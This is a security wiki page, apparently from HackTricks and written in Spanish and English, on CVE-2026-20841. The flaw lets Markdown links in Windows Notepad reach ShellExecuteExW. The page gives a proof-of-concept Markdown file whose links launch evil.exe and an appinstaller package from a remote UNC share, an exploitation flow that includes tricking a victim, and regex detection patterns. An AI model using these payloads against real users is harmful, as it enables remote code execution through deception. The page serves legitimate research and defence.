# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Las aplicaciones modernas de Windows que renderizan Markdown/HTML suelen convertir los enlaces suministrados por el usuario en elementos clicables y los pasan a `ShellExecuteExW`. Sin una lista estricta de esquemas permitidos, cualquier manejador de protocolo registrado (p. ej., `file:`, `ms-appinstaller:`) puede activarse, lo que puede derivar en ejecución de código en el contexto del usuario actual.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad chooses Markdown mode **only for `.md` extensions** via a fixed string comparison in `sub_1400ED5D0()`.
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), so both syntaxes matter for payloads and detections.
- Link clicks are processed in `sub_140170F60()`, which performs weak filtering and then calls `ShellExecuteExW`.
- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S).

### Payload considerations
- Any `\\` sequences in the link are **normalized to `\`** before `ShellExecuteExW`, impacting UNC/path crafting and detection.
- `.md` files are **not associated with Notepad by default**; the victim must still open the file in Notepad and click the link, but once rendered, the link is clickable.
- Dangerous example schemes:
- `file://` to launch a local/UNC payload.
- `ms-appinstaller://` to trigger App Installer flows. Other locally registered schemes may also be abusable.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flujo de explotación
1. Crea un archivo **`.md`** para que Notepad lo muestre como Markdown.
2. Incrusta un enlace usando un esquema URI peligroso (`file:`, `ms-appinstaller:`, o cualquier handler instalado).
3. Distribuye el archivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o similar) y convence al usuario de abrirlo en Notepad.
4. Al hacer clic, el **enlace normalizado** se entrega a `ShellExecuteExW` y el manejador de protocolo correspondiente ejecuta el contenido referenciado en el contexto del usuario.

## Ideas de detección
- Monitorea transferencias de archivos `.md` a través de puertos/protocolos que comúnmente entregan documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analiza enlaces Markdown (estándar y autolink) y busca `file:` o `ms-appinstaller:` sin distinguir mayúsculas/minúsculas.
- Expresiones regulares guiadas por el proveedor para detectar acceso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- El comportamiento del parche supuestamente **allowlists local files and HTTP(S)**; cualquier otra cosa que llegue a `ShellExecuteExW` es sospechosa. Extiende las detecciones a otros manejadores de protocolo instalados según sea necesario, ya que la superficie de ataque varía según el sistema.

## Referencias
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
